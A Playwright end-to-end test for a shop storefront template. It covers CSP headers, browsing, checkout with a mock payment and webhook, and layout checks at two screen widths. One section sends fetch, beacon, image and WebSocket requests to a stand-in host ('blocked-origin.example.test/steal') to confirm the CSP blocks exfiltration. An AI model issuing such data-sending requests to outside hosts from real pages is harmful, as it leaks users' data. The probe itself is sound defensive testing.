#!/usr/bin/env node
// Storefront browser test (headless Chromium, Playwright borrowed from the platform checkout). Template-only.
// Needs the THROWAWAY stack (tests/e2e/stack-up.sh), the demo shop loaded with catalog/catalog.sample.json
// (scripts/import-catalog.mjs) and the storefront served by tests/e2e/serve-storefront.mjs.
//
//   E2E_OUT=<screenshot dir> node tests/e2e/storefront.mjs
//
// Covers: home, category list, product detail, add to bag, guest checkout with the mock payment (signed webhook),
// order status, at 390px and 1280px, with screenshots, console-error and horizontal-overflow checks.
import { createRequire } from 'node:module';
import { createHmac } from 'node:crypto';
import { mkdirSync } from 'node:fs';
import { resolve } from 'node:path';
import { tmpdir } from 'node:os';

const SITE = process.env.E2E_STOREFRONT_URL || 'http://localhost:8788';
const API = process.env.E2E_API_BASE_URL || 'http://127.0.0.1:8180';
const OUT = process.env.E2E_OUT || resolve(tmpdir(), 'merchant-template-shots');
const ECOM = process.env.PLATFORM_DIR || resolve(import.meta.dirname, '../../../ecommerce');
const SECRET = process.env.E2E_MOCK_WEBHOOK_SECRET || 'e2e-mock-webhook-secret-for-throwaway-stack-only-0001';
mkdirSync(OUT, { recursive: true });
const { chromium } = createRequire(resolve(ECOM, 'e2e/package.json'))('playwright');

let failures = 0;
const check = (name, cond, extra = '') => { if (cond) console.log(`  ok  ${name}`); else { failures++; console.error(`  FAIL ${name} ${extra}`); } return Boolean(cond); };
const section = (t) => console.log(`\n${t}`);
const taipeiDate = (days = 1) => new Intl.DateTimeFormat('sv-SE', { timeZone: 'Asia/Taipei' }).format(new Date(Date.now() + days * 86400000));

section('0. The storefront is served with the strict CSP from public/_headers (violations show up as console errors below)');
{
  const r = await fetch(SITE + '/');
  const csp = r.headers.get('content-security-policy') || '';
  check("CSP header present: script-src 'self' and no unsafe-eval", /script-src 'self';/.test(csp) && !/unsafe-eval/.test(csp), csp.slice(0, 120));
}

const browser = await chromium.launch();
async function open(width, height) {
  const ctx = await browser.newContext({ viewport: { width, height }, deviceScaleFactor: 1 });
  const page = await ctx.newPage();
  page.errors = []; page.responses = [];
  page.on('pageerror', (e) => page.errors.push(e.message));
  page.on('console', (m) => { if (m.type() === 'error' && !/mock-payments\.test|ERR_NAME_NOT_RESOLVED/.test(m.text())) page.errors.push(m.text()); });
  page.on('response', async (r) => { if (/\/api\/v1\/shop\//.test(r.url())) { try { page.responses.push({ url: r.url(), status: r.status(), json: await r.json().catch(() => null) }); } catch { /* */ } } });
  await page.route('https://mock-payments.test/**', (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<h1>mock payment page</h1>' }));
  return page;
}
const overflow = (page) => page.evaluate(() => {
  const w = window.innerWidth; let worst = document.documentElement.scrollWidth - w;
  for (const el of document.querySelectorAll('body *')) {
    if (el.closest('svg')) continue;
    const r = el.getBoundingClientRect(); if (!r.width || !r.height) continue;
    if (getComputedStyle(el).position === 'fixed') continue;
    worst = Math.max(worst, Math.ceil(r.right - w), Math.ceil(-r.left));
  }
  return worst;
});
const shot = async (page, name) => { await page.waitForTimeout(250); await page.screenshot({ path: resolve(OUT, `${name}.png`), fullPage: true }); };
const imagesLoaded = (page) => page.evaluate(() => [...document.images].filter((i) => i.getBoundingClientRect().width > 0).every((i) => i.complete));

section('0b. D20: the CSP is pinned to the merchant origins (connect-src = the API only, img-src = the image origin only); another https origin is blocked in a real browser');
{
  const r = await fetch(SITE + '/');
  const csp = r.headers.get('content-security-policy') || '';
  const dir = (n) => (csp.split(';').map((s) => s.trim().split(' ')).find((a) => a[0] === n) || []).slice(1);
  check('connect-src lists self + the API origin only (no https: / *)', JSON.stringify(dir('connect-src')) === JSON.stringify(["'self'", new URL(API).origin]), JSON.stringify(dir('connect-src')));
  check('img-src lists self, data: and the image origin only (no https: / *)', dir('img-src').length === 3 && dir('img-src')[0] === "'self'" && dir('img-src')[1] === 'data:' && !dir('img-src').includes('https:') && !dir('img-src').includes('*'), JSON.stringify(dir('img-src')));
  check('frame-src is none and form-action keeps only self + the two ECPay hosts', JSON.stringify(dir('frame-src')) === JSON.stringify(["'none'"]) && dir('form-action').length === 3, JSON.stringify([dir('frame-src'), dir('form-action')]));
  const page = await open(1280, 800);
  await page.goto(SITE + '/', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(500);
  const probe = await page.evaluate(async () => {
    const out = {}; const viol = [];
    document.addEventListener('securitypolicyviolation', (e) => viol.push(e.effectiveDirective + ' ' + e.blockedURI));
    // the page's own CSP applies to scripts a design layer could run: another https origin is refused, the API origin is not
    try { await fetch('https://blocked-origin.example.test/steal?d=1', { mode: 'no-cors' }); out.fetch = 'allowed'; } catch (e) { out.fetch = 'blocked'; }
    try { await new Promise((res, rej) => { const x = new XMLHttpRequest(); x.onerror = () => rej(new Error('blocked')); x.onload = res; x.open('GET', 'https://blocked-origin.example.test/x'); x.send(); }); out.xhr = 'allowed'; } catch (e) { out.xhr = 'blocked'; }
    navigator.sendBeacon('https://blocked-origin.example.test/b', 'x');   // returns true when queued: the CSP violation event is the evidence
    await new Promise((r) => setTimeout(r, 400));
    out.beacon = viol.some((v) => v.startsWith('connect-src') && v.includes('/b')) ? 'blocked' : 'allowed';
    out.img = await new Promise((res) => { const i = new Image(); i.onload = () => res('allowed'); i.onerror = () => res('blocked'); i.src = 'https://blocked-origin.example.test/p.gif'; });
    out.ws = await new Promise((res) => { try { const w = new WebSocket('wss://blocked-origin.example.test/'); w.onopen = () => res('allowed'); w.onerror = () => res('blocked'); } catch (e) { res('blocked'); } });
    out.internal = typeof (window.ShopCommerce || {})._internal;
    out.frozenConfig = Object.isFrozen(window.SHOP_CONFIG);
    return out;
  });
  check('fetch to another https origin is blocked by connect-src', probe.fetch === 'blocked', JSON.stringify(probe));
  check('XMLHttpRequest to another https origin is blocked', probe.xhr === 'blocked', JSON.stringify(probe));
  check('sendBeacon to another https origin is blocked', probe.beacon === 'blocked', JSON.stringify(probe));
  check('an image ping to another https origin is blocked by img-src', probe.img === 'blocked', JSON.stringify(probe));
  check('a WebSocket to another origin is blocked', probe.ws === 'blocked', JSON.stringify(probe));
  check('ShopCommerce has no _internal handle and SHOP_CONFIG is frozen in the real page', probe.internal === 'undefined' && probe.frozenConfig === true, JSON.stringify(probe));
  await page.context().close();
}

section('0c. D20: checkout reaches the ECPay form POST (stage host) with no CSP violation (the payments API answer is stubbed; the ECPay host is stubbed too)');
{
  const page = await open(1280, 800);
  const cors = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
  await page.route('**/api/v1/shop/guest/order/payments', (route) => route.request().method() === 'OPTIONS'
    ? route.fulfill({ status: 204, headers: cors })
    : route.fulfill({ status: 201, contentType: 'application/json', headers: cors, body: JSON.stringify({ redirect_form: { method: 'POST', action: 'https://payment-stage.ecpay.com.tw/Cashier/AioCheckOut/V5', fields: { MerchantTradeNo: 'T1', CheckMacValue: 'x' } } }) }));
  let posted = null;
  await page.route('https://payment-stage.ecpay.com.tw/**', (route) => { posted = { method: route.request().method(), body: route.request().postData() || '' }; return route.fulfill({ status: 200, contentType: 'text/html', body: '<h1>stage ecpay</h1>' }); });
  await page.goto(SITE + '/', { waitUntil: 'domcontentloaded' });
  await page.evaluate(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.effectiveDirective + ' ' + e.blockedURI)); });
  await page.waitForTimeout(300);
  const nav = page.waitForRequest((r) => r.url().startsWith('https://payment-stage.ecpay.com.tw/'), { timeout: 10000 }).catch(() => null);
  await page.evaluate(async () => { const r = await window.ShopCommerce.checkout.startPayment('tok'); window.ShopCommerce.checkout.redirectToPayment(r); });
  await nav;
  await page.waitForTimeout(500);
  check('the form was POSTed to the ECPay stage host', posted && posted.method === 'POST' && /MerchantTradeNo=T1/.test(posted.body), JSON.stringify(posted));
  check('no CSP violation on the way (the page did not report one before leaving)', page.errors.filter((e) => /Content Security Policy|violates/.test(e)).length === 0, JSON.stringify(page.errors));
  await page.context().close();
}

/* ---------------- desktop: the full journey ---------------- */
section('desktop 1280: home, category list, product detail');
{
  const page = await open(1280, 900);
  await page.goto(SITE + '/#/');
  await page.waitForSelector('.featured .card, .featured [class*="card"]', { timeout: 15000 });
  check('home shows the brand, hero, featured products and no template leftovers', (await page.locator('a.brand').innerText()).trim().length > 0 /* platform content may replace the default brand */ && (await page.locator('.featured a[href^="#/product/"]').count()) >= 3);
  check('document title and no remote font requests', (await page.title()) === '你的商店');
  await shot(page, 'desktop-01-home');
  check('home: no horizontal overflow', (await overflow(page)) <= 0, String(await overflow(page)));

  await page.goto(SITE + '/#/shop/home');
  await page.waitForSelector('.grid-3--shop a[href^="#/product/"]');
  const names = await page.locator('.grid-3--shop a[href^="#/product/"]').count();
  check('category list (居家) shows its products only', names === 3, String(names));
  await shot(page, 'desktop-02-category');
  await page.goto(SITE + '/#/shop');
  await page.waitForSelector('.grid-3--shop a[href^="#/product/"]');
  check('all products list shows the 8 sample products', (await page.locator('.grid-3--shop a[href^="#/product/"]').count()) === 8);
  check('product images loaded', await imagesLoaded(page) && (await page.locator('[style*="background-image"]').count()) > 0);
  await shot(page, 'desktop-03-shop-all');
  // search keeps the cursor
  await page.locator('[data-act="toggleSearch"]').first().click();
  await page.locator('input[data-k="q"]').first().fill('杯');
  await page.waitForTimeout(200);
  check('search filters and keeps focus', (await page.locator('.grid-3--shop a[href^="#/product/"]').count()) === 1 && (await page.evaluate(() => document.activeElement && document.activeElement.getAttribute('data-k'))) === 'q');

  await page.goto(SITE + '/#/product/daily-mug');
  await page.waitForSelector('.pdp');
  const sizes = await page.locator('.size-btn').allInnerTexts();
  check('product detail: title, S/M/L sizes with labels, price', (await page.locator('.pdp h1').innerText()).includes('日常') && sizes.length === 3 && /^S/.test(sizes[0]) && /^L/.test(sizes[2]), JSON.stringify(sizes));
  await shot(page, 'desktop-04-product');
  await page.locator('.size-btn').nth(2).click();
  const priceL = await page.locator('.pdp__price').innerText();
  check('choosing L changes the price (SKU price, absolute)', /880/.test(priceL), priceL);
  await page.locator('.pdp .btn-primary').first().click();
  await page.waitForSelector('.drawer, [class*="drawer"]');
  check('add to bag: drawer opens with the line and total', (await page.locator('.drawer').innerText()).includes('日常') && /880/.test(await page.locator('.drawer').innerText()));
  await shot(page, 'desktop-05-drawer');
  await page.locator('.drawer [data-act="goCheckout"]').click();
  await page.waitForSelector('input[data-k="email"]');

  section('desktop 1280: guest checkout with the mock payment, then order status');
  await page.fill('input[data-k="email"]', `tpl-${Date.now()}@example.com`);
  await page.fill('input[data-k="name"]', '測試收件人');
  await page.fill('input[data-k="phone"]', '0912345678');
  await page.fill('input[data-k="addr"]', '台北市大安區範例路 1 號');
  await shot(page, 'desktop-06-checkout-1');
  await page.locator('[data-act="nextStep"]').click();
  await page.waitForSelector('.ship');
  await page.locator('.ship').first().click();
  await page.fill('input[data-k="date"]', taipeiDate(2));
  await shot(page, 'desktop-07-checkout-2');
  await page.locator('[data-act="nextStep"]').click();
  await page.waitForSelector('.summary');
  await shot(page, 'desktop-08-checkout-3');
  let captured = null;
  await page.route('**/api/v1/shop/guest/order/payments', async (route) => {
    const resp = await route.fetch();
    const text = await resp.text();
    captured = { status: resp.status(), json: JSON.parse(text) };
    await route.fulfill({ status: resp.status(), headers: resp.headers(), body: text });
  });
  await page.locator('[data-act="nextStep"]').click();
  await page.waitForURL(/mock-payments\.test/, { timeout: 20000 });
  const pay = captured;
  const ord = page.responses.find((r) => /guest\/checkout/.test(r.url));
  check('checkout created an order and a payment redirect to the provider', ord && ord.status === 201 && pay && pay.status === 201 && pay.json && pay.json.redirect_url, JSON.stringify([ord && ord.status, pay && pay.status]));
  const body = JSON.stringify({ provider_reference: pay.json.provider_reference, status: 'succeeded' });
  const hook = await fetch(`${API}/api/v1/webhooks/payments/mock`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-payment-signature': createHmac('sha256', SECRET).update(body).digest('hex') }, body });
  check('signed mock webhook accepted', hook.status < 300, String(hook.status));
  await page.goto(SITE + '/');
  await page.waitForSelector('text=已付款', { timeout: 15000 });
  check('order status page shows the order as paid', (await page.locator('body').innerText()).includes('已付款'));
  await shot(page, 'desktop-09-order-status');
  check('no console errors on desktop', page.errors.length === 0, page.errors.join(' | '));
  await page.context().close();
}

/* ---------------- phone: browse, bag, checkout form, status ---------------- */
section('phone 390: home, shop, product, bag, checkout, 404 product');
{
  const page = await open(390, 844);
  const pass = async (hash, name, sel) => {
    await page.goto(SITE + '/#' + hash);
    if (sel) await page.waitForSelector(sel, { timeout: 15000 });
    await shot(page, name);
    const o = await overflow(page);
    check(`${name}: no horizontal overflow at 390px`, o <= 0, String(o));
  };
  await pass('/', 'phone-01-home', '.m-hero, .m-grid a');
  await pass('/shop', 'phone-02-shop', '.m-grid a[href^="#/product/"]');
  check('phone shop lists the 8 products', (await page.locator('.m-grid a[href^="#/product/"]').count()) === 8);
  await pass('/shop/home', 'phone-03-category', '.m-grid a[href^="#/product/"]');
  await pass('/product/pure-candle', 'phone-04-product', '.m-pdp__price');
  await page.locator('.m-size').nth(1).click();
  await page.locator('[data-act="addCurrent"]').first().click();
  await page.waitForTimeout(300);
  await pass('/cart', 'phone-05-bag', '.m-cart');
  check('bag lists the added product with a checkout button', (await page.locator('.m-cart').innerText()).includes('香氛') && (await page.locator('[data-act="goCheckout"]').count()) > 0);
  await page.locator('[data-act="goCheckout"]').first().click();
  await page.waitForSelector('input[data-k="email"]');
  await shot(page, 'phone-06-checkout');
  check('phone checkout: no horizontal overflow', (await overflow(page)) <= 0, String(await overflow(page)));
  await pass('/story', 'phone-07-story', '.m-story__head');
  await pass('/store', 'phone-08-store', '.m-store__head');
  await pass('/product/does-not-exist', 'phone-09-missing-product', '.m-empty');
  check('no console errors on phone', page.errors.length === 0, page.errors.join(' | '));
  await page.context().close();
}

await browser.close();
console.log(failures ? `\n${failures} check(s) FAILED` : '\nstorefront e2e: all checks passed');
console.log('screenshots:', OUT);
process.exit(failures ? 1 : 0);
